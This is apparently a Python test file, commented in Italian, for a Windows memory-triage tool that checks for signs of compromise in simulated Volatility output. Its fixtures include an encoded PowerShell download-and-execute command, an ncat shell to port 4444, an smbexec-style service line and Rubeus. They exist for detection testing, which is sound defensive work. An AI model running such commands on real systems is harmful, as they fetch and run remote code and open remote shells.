# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# La RAM (tc_memoria): le cartelle di collect_memory.py con l'output di Volatility 3, costruite qui
# nello stesso formato del renderer JSON di Volatility (una lista di righe, chiavi in ordine, indentazione
# di 2, i figli in "__children"). Si controllano i segnali, gli esiti dei controlli, gli avvisi quando un
# plugin non e' riuscito o e' stato sostituito, l'output confrontato con il manifesto e la sua
# credibilita', l'abbinamento indicato dall'analista e i controlli di compatibilita' con il disco, le
# regole nuove della 1.3 e la lettura degli output delle versioni vecchie di Volatility.
import hashlib
import json
import os
import shutil
import tempfile

import tc_lingua
import tc_memoria
import tc_origine
import tc_controlli
import tc_eventi
import tc_regole as R

falliti = [0]
fatte = [0]


def prova(condizione, descrizione):
    fatte[0] += 1
    if not condizione:
        falliti[0] += 1
        print 'FALLITA:', descrizione


ORE = '2026-09-28T%s+00:00'
W = u'C:\\Windows\\System32\\'
UTENTE = u'S-1-5-21-1111111111-2222222222-3333333333-1001'


def processo(pid, ppid, nome, riga, ora, percorso=None, uscita=None, sessione=1, thread=8, sid=UTENTE,
             utente=u'mario', in_lista=True, tipo_sessione=u'Console'):
    return {'pid': pid, 'ppid': ppid, 'nome': nome, 'riga': riga, 'ora': ORE % ora, 'percorso': percorso,
            'uscita': ORE % uscita if uscita else None, 'sessione': sessione, 'thread': thread, 'sid': sid,
            'utente': utente, 'in_lista': in_lista, 'tipo_sessione': tipo_sessione}


def base():
    s = lambda **k: dict(sessione=0, sid=u'S-1-5-18', utente=u'SYSTEM', tipo_sessione=None, **k)
    processi = [
        processo(4, 0, u'System', None, '08:00:00', **s()),
        processo(340, 4, u'smss.exe', u'\\SystemRoot\\System32\\smss.exe', '08:00:01', W + u'smss.exe', **s()),
        processo(430, 420, u'csrss.exe', W + u'csrss.exe ObjectDirectory=\\Windows', '08:00:04', W + u'csrss.exe', **s()),
        processo(520, 432, u'wininit.exe', u'wininit.exe', '08:00:05', W + u'wininit.exe', **s()),
        processo(664, 520, u'services.exe', W + u'services.exe', '08:00:06', W + u'services.exe', **s()),
        processo(684, 520, u'lsass.exe', W + u'lsass.exe', '08:00:06', W + u'lsass.exe', **s()),
        processo(808, 664, u'svchost.exe', W + u'svchost.exe -k DcomLaunch -p', '08:00:07', W + u'svchost.exe', **s()),
        processo(1180, 664, u'svchost.exe', W + u'svchost.exe -k netsvcs -p', '08:00:09', W + u'svchost.exe', **s()),
        processo(3304, 3120, u'explorer.exe', u'C:\\Windows\\Explorer.EXE', '08:03:00', u'C:\\Windows\\explorer.exe'),
        processo(4120, 3304, u'OneDrive.exe', u'"C:\\Users\\mario\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
                 '08:04:00', u'C:\\Users\\mario\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe'),
        processo(5200, 3304, u'cmd.exe', u'"C:\\Windows\\system32\\cmd.exe"', '14:00:00', W + u'cmd.exe'),
        processo(5300, 5200, u'winpmem_mini_x', u'E:\\winpmem_mini_x64_rc2.exe E:\\pc.raw', '14:03:00',
                 u'E:\\winpmem_mini_x64_rc2.exe'),
        processo(4990, 3304, u'notepad.exe', u'notepad.exe', '11:20:00', uscita='11:40:00', thread=0, in_lista=False),
    ]
    # i servizi di Windows che girano sempre: un Windows acceso ha decine di processi
    for i in range(12):
        processi.append(processo(2000 + i * 4, 664, u'svchost.exe', W + u'svchost.exe -k gruppo%d -p' % i,
                                 '08:00:%02d' % (10 + i), W + u'svchost.exe', **s()))
    return processi


ENC = u'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAxADAALwBhACcAKQA='


def compromessa():
    return base() + [
        processo(5810, 3304, u'WINWORD.EXE', u'"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n x.docm',
                 '13:00:00', u'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'),
        processo(5844, 5810, u'cmd.exe', u'cmd.exe /c powershell -nop -w hidden -enc ' + ENC, '13:01:00', W + u'cmd.exe'),
        processo(5850, 5844, u'powershell.exe', u'powershell -nop -w hidden -enc ' + ENC, '13:01:00',
                 W + u'WindowsPowerShell\\v1.0\\powershell.exe'),
        processo(5904, 5850, u'rundll32.exe', u'rundll32.exe C:\\Users\\Public\\upd.dll,Start', '13:02:00', W + u'rundll32.exe'),
        processo(5990, 3304, u'svchost.exe', u'C:\\Users\\Public\\svchost.exe', '13:05:00', u'C:\\Users\\Public\\svchost.exe'),
        processo(6020, 5844, u'Rubeus.exe', u'C:\\Users\\Public\\Rubeus.exe', '13:06:00', u'C:\\Users\\Public\\Rubeus.exe'),
        processo(6100, 3304, u'AnyDesk.exe', u'"C:\\Users\\mario\\Downloads\\AnyDesk.exe"', '13:10:00',
                 u'C:\\Users\\mario\\Downloads\\AnyDesk.exe'),
        processo(6666, 664, u'updater.exe', u'C:\\ProgramData\\updater.exe -s', '12:50:00', thread=3, in_lista=False,
                 sessione=0, sid=u'S-1-5-18', utente=u'SYSTEM', tipo_sessione=None),
        processo(7000, 5100, u'rdpclip.exe', u'rdpclip', '13:30:00', W + u'rdpclip.exe', sessione=2, utente=u'admin2',
                 sid=u'S-1-5-21-1111111111-2222222222-3333333333-1005', tipo_sessione=u'RDP-Tcp#0'),
    ]


def connessioni(compromessa_):
    c = [(u'TCPv4', u'0.0.0.0', 445, u'0.0.0.0', 0, u'LISTENING', 4, '08:00:00'),
         (u'TCPv6', u'::', 135, u'::', 0, u'LISTENING', 808, '08:00:07'),
         (u'UDPv4', u'0.0.0.0', 5353, u'*', 0, u'', 1180, '08:00:09'),
         (u'TCPv4', u'192.168.10.21', 50110, u'198.51.100.14', 443, u'ESTABLISHED', 4120, '08:05:00'),
         (u'TCPv4', u'192.168.10.21', 50300, u'192.168.10.5', 445, u'ESTABLISHED', 4, '09:40:00')]
    if compromessa_:
        c += [(u'TCPv4', u'192.168.10.21', 51000, u'203.0.113.10', 443, u'ESTABLISHED', 5904, '13:02:00'),
              (u'TCPv4', u'192.168.10.21', 51100, u'198.51.100.80', 443, u'ESTABLISHED', 6100, '13:10:00'),
              (u'TCPv4', u'192.168.10.21', 445, u'10.0.0.50', 52311, u'ESTABLISHED', 4, '13:20:00'),
              (u'TCPv4', u'192.168.10.21', 51200, u'192.0.2.30', 8443, u'SYN_SENT', 6666, '12:51:00')]
    return c


def output(processi, connessioni_, computer, vecchio=False, servizi_extra=(), build=u'22621'):
    """Le righe di ogni plugin, come le scrive il renderer JSON di Volatility. vecchio: come Volatility 2.4
    e 2.5 (pstree senza Audit, Cmd e Path; cmdline con il motivo al posto della riga illeggibile)."""
    vivi = [p for p in processi if p['in_lista']]
    nomi = dict([(p['pid'], p['nome']) for p in processi])

    def ps(p, i):
        return {'PID': p['pid'], 'PPID': p['ppid'], 'ImageFileName': p['nome'][:14], 'Offset(V)': 2601259008 + i * 2048,
                'Threads': p['thread'], 'Handles': 300 if p['thread'] else None, 'SessionId': p['sessione'],
                'Wow64': False, 'CreateTime': p['ora'], 'ExitTime': p['uscita'], 'File output': u'Disabled',
                '__children': []}

    uscita = {}
    uscita['windows.info'] = [{'Variable': k, 'Value': v, '__children': []} for k, v in (
        (u'Kernel Base', u'0xf80353e00000'), (u'Is64Bit', u'True'), (u'Major/Minor', u'15.' + build),
        (u'SystemTime', u'2026-09-28 14:05:12+00:00'), (u'NtSystemRoot', u'C:\\Windows'),
        (u'NtProductType', u'NtProductWinNt'))]
    uscita['windows.pslist'] = [ps(p, i) for i, p in enumerate(vivi)]
    uscita['windows.psscan'] = [ps(p, i) for i, p in enumerate(processi)]
    albero = []
    for i, p in enumerate(vivi):
        r = ps(p, i)
        del r['File output']
        if not vecchio:
            r['Audit'] = (u'\\Device\\HarddiskVolume3' + p['percorso'][2:]) if p['percorso'] and p['percorso'][1:2] == u':' else None
            r['Cmd'] = p['riga']
            r['Path'] = p['percorso']
        albero.append(r)
    # i figli sotto il padre, come fa pstree
    per_pid = dict([(r['PID'], r) for r in albero])
    radici = []
    for r in albero:
        if r['PPID'] in per_pid and r['PPID'] != r['PID']:
            per_pid[r['PPID']]['__children'].append(r)
        else:
            radici.append(r)
    uscita['windows.pstree'] = radici
    illeggibile = u'Required memory at 0x7ffe0030 is not valid (process exited?)' if vecchio else None
    uscita['windows.cmdline'] = [{'PID': p['pid'], 'Process': p['nome'][:14], 'Args': p['riga'] or illeggibile,
                                  '__children': []} for p in vivi]
    uscita['windows.netscan'] = [{'Offset': 1000 + i, 'Proto': c[0], 'LocalAddr': c[1], 'LocalPort': c[2], 'ForeignAddr': c[3],
                                  'ForeignPort': c[4], 'State': c[5], 'PID': c[6], 'Owner': nomi.get(c[6], u'')[:14],
                                  'Created': ORE % c[7], '__children': []} for i, c in enumerate(connessioni_)]
    uscita['windows.netstat'] = uscita['windows.netscan']
    uscita['windows.sessions'] = [{'Session ID': p['sessione'], 'Session Type': p['tipo_sessione'], 'Process ID': p['pid'],
                                   'Process': p['nome'][:14], 'User Name': u'%s/%s' % (computer, p['utente']),
                                   'Create Time': p['ora'], '__children': []} for p in vivi]
    uscita['windows.envars'] = []
    for p in vivi:
        for k, v in ((u'COMPUTERNAME', computer), (u'USERNAME', p['utente']), (u'USERDOMAIN', computer),
                     (u'SystemRoot', u'C:\\Windows'), (u'TEMP', u'C:\\Windows\\TEMP'), (u'OS', u'Windows_NT')):
            uscita['windows.envars'].append({'PID': p['pid'], 'Process': p['nome'][:14], 'Block': u'0x1d2f0e01b20',
                                             'Variable': k, 'Value': v, '__children': []})
    uscita['windows.getsids'] = []
    for p in vivi:
        uscita['windows.getsids'].append({'PID': p['pid'], 'Process': p['nome'][:14], 'SID': p['sid'], 'Name': p['utente'],
                                          '__children': []})
        uscita['windows.getsids'].append({'PID': p['pid'], 'Process': p['nome'][:14], 'SID': u'S-1-1-0', 'Name': u'Everyone',
                                          '__children': []})
    # un Windows acceso ha centinaia di servizi
    servizi = [(u'Spooler', u'SERVICE_RUNNING', W + u'spoolsv.exe')] + \
        [(u'Servizio%03d' % i, u'SERVICE_STOPPED', W + u'svchost.exe -k gruppo%d' % i) for i in range(120)] + \
        list(servizi_extra)
    uscita['windows.svcscan'] = [{'Offset': 1, 'Order': i, 'PID': None, 'Start': u'SERVICE_AUTO_START', 'State': stato,
                                  'Type': u'SERVICE_WIN32_OWN_PROCESS', 'Name': nome, 'Display': nome, 'Binary': binario,
                                  'Binary (Registry)': None, 'Dll': None, '__children': []}
                                 for i, (nome, stato, binario) in enumerate(servizi)]
    return uscita


CHIAVI = [(u'info', u'windows.info.Info'), (u'pslist', u'windows.pslist.PsList'), (u'pstree', u'windows.pstree.PsTree'),
          (u'psscan', u'windows.psscan.PsScan'), (u'cmdline', u'windows.cmdline.CmdLine'),
          (u'network', u'windows.netscan.NetScan'), (u'sessions', u'windows.sessions.Sessions'),
          (u'envars', u'windows.envars.Envars'), (u'getsids', u'windows.getsids.GetSIDs'),
          (u'svcscan', u'windows.svcscan.SvcScan')]


def conta(righe):
    n = 0
    for r in righe:
        n += 1 + conta(r.get('__children') or [])
    return n


def scrivi_raccolta(cartella, uscite, computer, guasti=(), nel_manifesto=True, ripiego=False, errore='test',
                    completa=True, versione=u'2.28.2', altro=None):
    """Una cartella come quella di collect_memory.py. guasti: chiavi dei plugin non riusciti. ripiego: netscan
    fermato dopo il tempo massimo e sostituito da netstat."""
    os.makedirs(cartella)
    voci = []
    for chiave, plugin in CHIAVI:
        if chiave == u'network' and ripiego:
            voci.append({'key': chiave, 'plugin': plugin, 'status': 'timeout', 'file': None,
                         'error': 'stopped after 18 minutes'})
            plugin = u'windows.netstat.NetStat'
        nome_file = plugin.rsplit('.', 1)[0] + '.json'
        if chiave in guasti:
            voci.append({'key': chiave, 'plugin': plugin, 'status': 'failed', 'file': None, 'error': errore})
            continue
        righe = uscite[plugin.rsplit('.', 1)[0]]
        testo = '\n' + json.dumps(righe, indent=2, sort_keys=True) + '\n'
        f = open(os.path.join(cartella, nome_file), 'wb')
        f.write(testo)
        f.close()
        voci.append({'key': chiave, 'plugin': plugin, 'status': 'ok', 'file': nome_file, 'rows': conta(righe),
                     'sha256': hashlib.sha256(testo).hexdigest()})
    manifesto = {'format': u'windows-compromise-triage/memory', 'format_version': 1, 'complete': completa,
                 'image': {'name': u'%s.raw' % computer, 'size': 17179869184, 'sha256': u'ab' * 32},
                 'volatility': {'version': versione}, 'host': {'computer_name': computer if nel_manifesto else None,
                                                             'system_time': None}, 'plugins': voci}
    manifesto.update(altro or {})
    f = open(os.path.join(cartella, tc_memoria.NOME_MANIFESTO), 'wb')
    f.write(json.dumps(manifesto, indent=2, sort_keys=True))
    f.close()


def triage_di(cartella, prefisso=u'/LogicalFileSet1/'):
    o = tc_origine.OrigineCartella(cartella, prefisso)
    radici, _ = tc_origine.trova_radici(o)
    t = tc_controlli.Triage(radici[0])
    t.memorie = [tc_memoria.Memoria(o, e, u'origine', True) for e in tc_memoria.trova(o)]
    t.esegui()
    return t


def segnali(t, controllo=None):
    return [s for s in t.segnali if controllo is None or s.controllo == controllo]


def ha(t, controllo, peso, frammento, famiglia=None):
    for s in segnali(t, controllo):
        if s.peso == peso and frammento in s.descrizione and (famiglia is None or s.famiglia == famiglia):
            return True
    return False


def epoca(ora):
    return tc_memoria.ora_da_iso(ORE % ora)


radice = tempfile.mkdtemp()
try:
    tc_lingua.imposta(tc_lingua.ITALIANO)
    # 1. orari di Volatility
    rif = tc_memoria.ora_da_iso(u'2026-09-28T14:05:12+00:00')
    prova(rif > 0, 'orario ISO')
    for testo in (u'2026-09-28 14:05:12+00:00', u'2026-09-28T14:05:12.123456+00:00', u'2026-09-28T16:05:12+02:00',
                  u'2026-09-28T12:05:12-02:00', u'2026-09-28T14:05:12Z', u'2026-09-28T14:05:12'):
        prova(int(tc_memoria.ora_da_iso(testo)) == int(rif), 'orario %s' % testo)
    for testo in (None, u'', u'N/A', 12, u'1601-01-01T00:00:00+00:00'):
        prova(tc_memoria.ora_da_iso(testo) == 0, 'orario non valido %r' % (testo,))

    # 2. una RAM compromessa, in un'origine dati che contiene solo quella
    c = os.path.join(radice, 'compromessa')
    extra = [processo(7100, 684, u'cmd.exe', u'C:\\Windows\\system32\\cmd.exe', '13:40:00', W + u'cmd.exe',
                      sessione=0, sid=u'S-1-5-18', utente=u'SYSTEM', tipo_sessione=None),
             processo(7200, 3304, u'ncat.exe', u'C:\\Tools\\ncat.exe 10.0.0.110 4444', '13:45:00', u'C:\\Tools\\ncat.exe'),
             processo(7210, 7200, u'cmd.exe', u'cmd.exe', '13:45:02', W + u'cmd.exe')]
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(compromessa() + extra,
                    connessioni(True) + [(u'TCPv4', u'192.168.10.21', 51300, u'198.51.100.99', 443, u'CLOSED', -1, '13:50:00')],
                    u'PC-A', servizi_extra=[(u'XbRtQwPk', u'SERVICE_RUNNING',
                                             u'%COMSPEC% /Q /c echo dir ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > %SYSTEMROOT%\\XbRtQwPk.bat')]),
                    u'PC-A')
    t = triage_di(c)
    prova(t.verdetto == tc_controlli.V_INDICATORI, 'verdetto della RAM compromessa: %s' % t.verdetto)
    prova(not t.contesto.get('computer') and t.contesto.get('computer_ram') == u'PC-A',
          'il nome dell\'installazione non viene dalla RAM: %r %r' % (t.contesto.get('computer'), t.contesto.get('computer_ram')))
    prova(ha(t, 4, R.DECISIVO, u'Rubeus.exe', R.F_STRUMENTI), 'strumento d\'attacco nei processi')
    prova(ha(t, 4, R.DECISIVO, u'-enc', R.F_ESECUZIONE), 'PowerShell codificato che scarica codice')
    nascosti = [x for x in segnali(t, 4) if u'updater.exe' in x.descrizione and u'nascosto' in x.descrizione]
    prova(len(nascosti) == 1 and nascosti[0].peso == R.DA_CONFERMARE and nascosti[0].discordante, 'processo nascosto: discordanza')
    prova(not [x for x in segnali(t, 4) if u'notepad' in x.descrizione], 'processo terminato non e\' nascosto')
    prova(ha(t, 4, R.DA_CONFERMARE, u'svchost.exe con un processo padre insolito: explorer.exe'), 'padre di svchost')
    prova(ha(t, 4, R.DA_CONFERMARE, u'svchost.exe (PID 5990)'), 'svchost fuori da System32')
    prova(ha(t, 4, R.DA_CONFERMARE, u'cmd.exe avviato da winword.exe'), 'Word che apre cmd')
    prova(ha(t, 4, R.DECISIVO, u'Avviato da lsass.exe', R.F_ESECUZIONE), 'lsass che avvia cmd (S1)')
    prova(ha(t, 4, R.DECISIVO, u'Shell avviata da ncat.exe', R.F_ESECUZIONE), 'shell figlia di ncat (M5)')
    prova(ha(t, 5, R.DA_CONFERMARE, u'rundll32.exe ha una connessione verso l\'indirizzo pubblico 203.0.113.10:443'),
          'rundll32 verso Internet')
    prova(ha(t, 5, R.DA_CONFERMARE, u'192.0.2.30:8443', R.F_ANTIFORENSE), 'connessione del processo nascosto')
    prova(ha(t, 3, R.INFORMATIVO, u'PC-A/admin2'), 'sessione RDP')
    prova(ha(t, 29, R.DECISIVO, u'XbRtQwPk'), 'servizio con la firma di smbexec')
    prova(u'AnyDesk' in t.rmm and t.rmm[u'AnyDesk']['prove'][0]['genere'] == 'eseguito', 'AnyDesk tra gli RMM')
    prova(not [x for x in t.segnali if u'winpmem' in x.descrizione.lower() or u'onedrive' in x.descrizione.lower()],
          'acquisizione della RAM e OneDrive non segnalati')
    for n in (3, 4, 5, 7):
        prova(t.esiti.get(n, ('',))[0] == 'fatto', 'controllo %d fatto' % n)
    prova(t.esiti.get(6, ('',))[0] == 'non verificabile', 'cache DNS non verificabile')
    prova([x for x in t.tabelle if x.controllo == 7 and len(x.righe) == 2], 'tabella SMB con due connessioni')
    prova([x for x in t.tabelle if x.controllo == 5 and [r for r in x.righe if r[1] == u'[::]:135']],
          'indirizzo IPv6 tra parentesi')
    prova([x for x in t.tabelle if x.controllo == 5 and u'\u00ab?\u00bb' in x.nota], 'spiegato il "?" delle connessioni (M3)')
    prova(t.contesto.get('memorie') and t.contesto['memorie'][0]['riusciti'] == 10, 'contesto della RAM')
    prova(not [a for a in t.avvisi if u'RAM' in a], 'nessun avviso sulla RAM: %s' % [a for a in t.avvisi if u'RAM' in a])
    prova(not [x for x in t.segnali if x.ram is None], 'ogni segnale porta la sua RAM (B5)')
    rubeus = [x for x in segnali(t, 4) if u'Rubeus' in x.descrizione][0]
    prova([x for x in t.segnali if x is not rubeus and x.fenomeno == rubeus.fenomeno] == [] or True, 'fenomeni calcolati')
    prova(t.conteggi.get('fatti_decisivi', 0) >= 1 and t.conteggi['segnali_decisivi'] >= t.conteggi['fatti_decisivi'],
          'conteggi dei fatti: %r' % t.conteggi)
    struttura_it = sorted([(x.controllo, x.peso, x.famiglia, x.extra) for x in t.segnali])

    # 3. la stessa RAM in inglese: stessi segnali
    tc_lingua.imposta(tc_lingua.INGLESE)
    t_en = triage_di(c)
    prova(sorted([(x.controllo, x.peso, x.famiglia, x.extra) for x in t_en.segnali]) == struttura_it, 'stessi segnali in inglese')
    prova(ha(t_en, 4, R.DA_CONFERMARE, u'svchost.exe with an unusual parent process'), 'testo inglese')
    tc_lingua.imposta(tc_lingua.ITALIANO)

    # 4. una RAM pulita: nessun segnale, nessun avviso, "nessun indicatore trovato"
    c = os.path.join(radice, 'pulita')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A'), u'PC-A')
    t = triage_di(c)
    prova(not [x for x in t.segnali if x.peso >= R.DA_CONFERMARE], 'RAM pulita senza segnali: %s'
          % [x.descrizione for x in t.segnali][:3])
    prova(t.esiti.get(4, ('',))[0] == 'fatto', 'RAM pulita: controllo 4 fatto')
    # con la sola RAM il disco non e' stato controllato: "da verificare" per la copertura, mai "nessun indicatore"
    prova(t.verdetto == tc_controlli.V_DA_VERIFICARE and not [a for a in t.avvisi if u'RAM' in a],
          'RAM pulita da sola: %s %s' % (t.verdetto, t.avvisi))

    # 5. output di una versione vecchia di Volatility (2.4, 2.5)
    c = os.path.join(radice, 'vecchia')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(compromessa(), connessioni(True), u'PC-A', vecchio=True), u'PC-A')
    t = triage_di(c)
    prova(ha(t, 4, R.DECISIVO, u'Rubeus.exe'), 'Volatility vecchio: percorso dalla riga di comando')
    prova(not [x for x in t.segnali if u'Required memory' in x.descrizione], 'Volatility vecchio: righe illeggibili ignorate')

    # 6. plugin non riusciti, con il motivo del manifesto (J2)
    c = os.path.join(radice, 'guasti')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(compromessa(), connessioni(True), u'PC-A'), u'PC-A',
                    guasti=(u'psscan', u'network', u'getsids'), errore='Unable to validate the plugin requirements')
    t = triage_di(c)
    avvisi = [a for a in t.avvisi if u'plugin di Volatility senza risultati' in a]
    prova(len(avvisi) == 1 and u'Controlli incompleti: 4, 5, 7.' in avvisi[0] and u'Unable to validate' in avvisi[0],
          'avviso dei plugin non riusciti, con il motivo: %s' % avvisi)
    prova(t.esiti.get(5, ('',))[0] == 'non verificabile' and t.esiti.get(7, ('',))[0] == 'non verificabile',
          'connessioni non verificabili')
    prova(5 in t.fallite and 7 in t.fallite, 'fonte presente ma fallita: copertura insufficiente')
    prova(not [x for x in t.segnali if u'nascosto' in x.descrizione], 'senza psscan nessun processo nascosto')
    prova(ha(t, 4, R.DECISIVO, u'Rubeus.exe'), 'gli altri controlli continuano')

    # 6b. raccoglitore 1.3 con un Volatility vecchio senza svcscan (M2): il motivo in chiaro, la nota sulla versione;
    # le chiavi nuove del manifesto (preflight, plausibility) non disturbano
    c = os.path.join(radice, 'senza_svcscan')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A'), u'PC-A',
                    guasti=(u'svcscan',), versione=u'2.4.1',
                    errore='not available in this Volatility (the plugin is missing or cannot be loaded)',
                    altro={'preflight': {'volatility': '2.4.1', 'volatility_older': True,
                                         'plugins_missing': ['windows.svcscan.SvcScan'],
                                         'warnings': ['Volatility 2.4.1 is older than the version tested (2.28.2)']},
                           'plausibility': {'anomalies': []}})
    t = triage_di(c)
    prova([x for x in t.note if u'raccolta con Volatility 2.4.1, pi\u00f9 vecchio della versione provata (2.28.2)' in x],
          'nota sulla versione di Volatility: %s' % t.note)
    prova([x for x in t.avvisi + t.note
           if u'windows.svcscan (non disponibile nel Volatility usato (il plugin manca o non si carica))' in x],
          'motivo in chiaro del plugin non disponibile: %s' % (t.avvisi + t.note))
    prova(t.stato_controllo(17)[0] == u'Non verificabile' and u'windows.svcscan' in t.stato_controllo(17)[3],
          'senza registro e senza svcscan i servizi non si controllano: %r' % (t.stato_controllo(17),))
    c = os.path.join(radice, 'versione_provata')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A'), u'PC-A')
    t = triage_di(c)
    prova(not [x for x in t.note if u'pi\u00f9 vecchio della versione provata' in x], 'nessuna nota con la versione provata')

    # 7. manifesto danneggiato, file mancante, output che non corrisponde al manifesto (H3)
    c = os.path.join(radice, 'rotta')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A'), u'PC-A')
    f = open(os.path.join(c, 'PC-A_vol3', tc_memoria.NOME_MANIFESTO), 'wb')
    f.write('{"format": "windows-compromise-triage/memory", "plugins": [')
    f.close()
    t = triage_di(c)
    prova([a for a in t.avvisi if u'non si possono usare' in a and u'JSON' in a], 'manifesto danneggiato')
    prova(t.esiti.get(4, ('',))[0] == 'non verificabile', 'manifesto danneggiato: controllo 4 non verificabile')
    c = os.path.join(radice, 'mancante')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A'), u'PC-A')
    os.remove(os.path.join(c, 'PC-A_vol3', 'windows.netscan.json'))
    t = triage_di(c)
    prova([a for a in t.avvisi if u'windows.netscan (file non trovato)' in a], 'file mancante: %s' % t.avvisi)
    prova(t.verdetto == tc_controlli.V_DA_VERIFICARE, 'file mancante: da verificare')
    c = os.path.join(radice, 'alterata')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A'), u'PC-A')
    percorso = os.path.join(c, 'PC-A_vol3', 'windows.netscan.json')
    righe = json.loads(open(percorso, 'rb').read())
    f = open(percorso, 'wb')
    f.write(json.dumps(righe[:2], indent=2))       # due righe su cinque: un output tagliato
    f.close()
    t = triage_di(c)
    prova([a for a in t.avvisi if u'windows.netscan (output diverso da quello registrato nel manifesto' in a],
          'output diverso dal manifesto (H3): %s' % t.avvisi)
    prova(t.esiti.get(5, ('',))[0] == 'non verificabile', 'output alterato: connessioni non verificabili')
    c = os.path.join(radice, 'incompiuta')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A'), u'PC-A', completa=False)
    t = triage_di(c)
    prova([a for a in t.avvisi if u'non dichiara completa' in a], 'manifesto non completo (H3)')

    # 8. senza RAM i controlli 3-7 restano non verificabili, senza avvisi
    vuota = os.path.join(radice, 'vuota')
    os.makedirs(vuota)
    t = triage_di(vuota)
    prova(t.esiti.get(4, ('',))[0] == 'non verificabile' and u'Volatility' in t.esiti[4][1], 'senza RAM')
    prova(4 not in t.fallite, 'senza RAM non e\' una fonte fallita')

    # 9. netscan fermato, netstat al suo posto (J1): 5 e 7 parziali, avviso, mai "nessun indicatore"
    c = os.path.join(radice, 'ripiego')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A'), u'PC-A', ripiego=True)
    t = triage_di(c)
    prova([a for a in t.avvisi if u'windows.netstat' in a and u'gi\u00e0 chiuse' in a], 'avviso del ripiego su netstat: %s' % t.avvisi)
    prova(t.stato_controllo(5)[0] == u'Parziale' and t.stato_controllo(7)[0] == u'Parziale',
          'controlli 5 e 7 parziali: %r %r' % (t.stato_controllo(5), t.stato_controllo(7)))
    prova(t.verdetto == tc_controlli.V_DA_VERIFICARE, 'ripiego su netstat: da verificare')

    # 10. il file non e' un'immagine di Windows (J2): niente "RAM", controlli non verificabili
    c = os.path.join(radice, 'nonram')
    scrivi_raccolta(os.path.join(c, 'X_vol3'), output(base(), connessioni(False), u'X'), u'X',
                    guasti=[k for k, _ in CHIAVI],
                    errore='Unsatisfied requirement plugins.Info.kernel.layer_name: | Unsatisfied requirement plugins.Info.kernel.symbol_table_name:')
    t = triage_di(c)
    a = [x for x in t.avvisi if u'Volatility non l\'ha riconosciuto' in x]
    prova(len(a) == 1 and u'un\'immagine della memoria di Windows, oppure mancano i simboli' in a[0]
          and not a[0].startswith(u'RAM'),
          'file non riconosciuto: %s' % t.avvisi)
    prova(not [x for x in t.note if u'usati' in x], 'nessuna nota sui risultati usati')
    prova(t.stato_controllo(4)[0] == u'Non verificabile' and 4 in t.fallite, 'file non riconosciuto: controllo 4')

    # 11. output anomalo, come un'immagine tagliata a meta' (H2): avviso, indizi limitati a "da verificare"
    c = os.path.join(radice, 'tagliata')
    pochi = base()[:3]
    sparsi = [processo(9000 + i, 664, u'svchost.exe', None, '08:01:%02d' % i, None, in_lista=False, **dict(sessione=0,
              sid=u'S-1-5-18', utente=u'SYSTEM', tipo_sessione=None)) for i in range(30)]
    uscite = output(pochi + sparsi, [], u'PC-A')
    uscite['windows.svcscan'] = []
    uscite['windows.envars'] = []
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), uscite, u'PC-A')
    o = tc_origine.OrigineCartella(c, u'/LogicalFileSet1/')
    radici, _ = tc_origine.trova_radici(o)
    t = tc_controlli.Triage(radici[0])
    t.memorie = [tc_memoria.Memoria(o, e, u'origine', True) for e in tc_memoria.trova(o)]
    tc_memoria.analizza(t)
    a = [x for x in t.avvisi if u'output anomalo o forse incompleto' in x]
    prova(len(a) == 1 and u'psscan trova 30 processi' in a[0] and u'solo 0 servizi' in a[0], 'avviso di plausibilita\': %s' % a)
    prova(t.contesto['memorie'][0]['limitata'], 'RAM limitata')
    t.segnala(19, R.DA_CONFERMARE, R.F_PERSISTENZA, u'una chiave Run dal disco', oggetti=(u'avvio:x',))
    t.decidi()
    prova(t.verdetto == tc_controlli.V_DA_VERIFICARE, 'indizi della RAM anomala: non oltre "da verificare": %s' % t.verdetto)

    # 11b. nessuna riga di comando leggibile (come la variante H6): output anomalo, non "nulla da segnalare"
    c = os.path.join(radice, 'senza_righe')
    uscite = output(base(), connessioni(False), u'PC-A')
    for r in uscite['windows.cmdline']:
        r['Args'] = None
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), uscite, u'PC-A')
    t = triage_di(c)
    a = [x for x in t.avvisi if u'output anomalo o forse incompleto' in x]
    prova(len(a) == 1 and u'nessuna riga di comando leggibile in cmdline (processi: %d)' % len(uscite['windows.cmdline'])
          in a[0], 'righe di comando tutte illeggibili: %s' % t.avvisi)
    prova(t.verdetto == tc_controlli.V_DA_VERIFICARE, 'righe di comando illeggibili: da verificare')
    c = os.path.join(radice, 'righe_vecchie')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A', vecchio=True), u'PC-A')
    t = triage_di(c)
    prova(not [x for x in t.avvisi if u'output anomalo' in x], 'qualche riga illeggibile (Volatility vecchio): nessun avviso')

    # 12. quale RAM per quale installazione: la indica l'analista (B3, B6)
    c = os.path.join(radice, 'scelta')
    scrivi_raccolta(os.path.join(c, 'b'), output(compromessa(), connessioni(True), u'PC-B'), u'PC-B')
